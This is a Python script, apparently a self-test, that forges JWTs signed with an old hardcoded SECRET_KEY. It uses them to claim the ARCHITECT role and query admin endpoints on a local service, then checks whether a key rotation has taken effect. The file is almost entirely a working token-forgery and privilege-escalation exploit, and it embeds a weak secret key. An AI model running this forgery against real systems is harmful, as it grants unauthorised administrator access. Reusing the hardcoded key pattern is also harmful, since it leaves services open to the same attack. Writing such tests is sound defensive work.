"""
Test the ARCHITECT role escalation path using the old SECRET_KEY.
If the container hasn't been restarted, the old key is still live.
"""
import sys, io
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")

import base64, hashlib, hmac, json, time, uuid
import requests

BASE = "http://localhost:8000"

# The old weak key — still in use until container restarts
OLD_KEY = b"deadnet-super-secret-key-change-in-production-please-32chars"

def forge_jwt(key: bytes, role: str, sub: str = "evil-architect") -> str:
    header  = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b"=").decode()
    payload = json.dumps({
        "sub":  sub,
        "role": role,
        "type": "access",
        "exp":  int(time.time()) + 3600,
        "iat":  int(time.time()),
        "jti":  str(uuid.uuid4()),
    })
    p_b64 = base64.urlsafe_b64encode(payload.encode()).rstrip(b"=").decode()
    msg   = f"{header}.{p_b64}".encode()
    sig   = base64.urlsafe_b64encode(
        hmac.new(key, msg, hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    return f"{header}.{p_b64}.{sig}"


print("=" * 60)
print("  ARCHITECT PRIVILEGE ESCALATION via JWT role claim")
print("=" * 60)
print()

# Forge ARCHITECT role token with old SECRET_KEY
arch_token = forge_jwt(OLD_KEY, "ARCHITECT", "evil-attacker")
h = {"Authorization": f"Bearer {arch_token}"}

print("[1] /auth/me with forged ARCHITECT token (old key)")
r = requests.get(BASE + "/auth/me", headers=h, timeout=5)
print(f"    status={r.status_code}  body={r.text[:120]}")
if r.status_code == 200 and '"role":"ARCHITECT"' in r.text:
    print("    *** CRITICAL: ARCHITECT ACCESS GRANTED via regular SECRET_KEY ***")
elif r.status_code == 200:
    print(f"    token accepted (role in response: see body)")
else:
    print("    BLOCKED")

print()
print("[2] /architect/overview (full architect admin panel)")
r2 = requests.get(BASE + "/architect/overview", headers=h, timeout=5)
print(f"    status={r2.status_code}  body={r2.text[:120]}")

print()
print("[3] /architect/accounts (list all architect callsigns)")
r3 = requests.get(BASE + "/architect/accounts", headers=h, timeout=5)
print(f"    status={r3.status_code}  body={r3.text[:120]}")

print()
print("[4] /architect/log (full audit trail)")
r4 = requests.get(BASE + "/architect/log", headers=h, timeout=5)
print(f"    status={r4.status_code}  body={r4.text[:120]}")

print()
if r.status_code == 200:
    print(">>> CONTAINER MUST BE RESTARTED to load the new SECRET_KEY <<<")
    print(">>> Until then, anyone who knows the old key has ARCHITECT access <<<")
else:
    print(">>> New SECRET_KEY is active. Old key forgery is blocked. <<<")
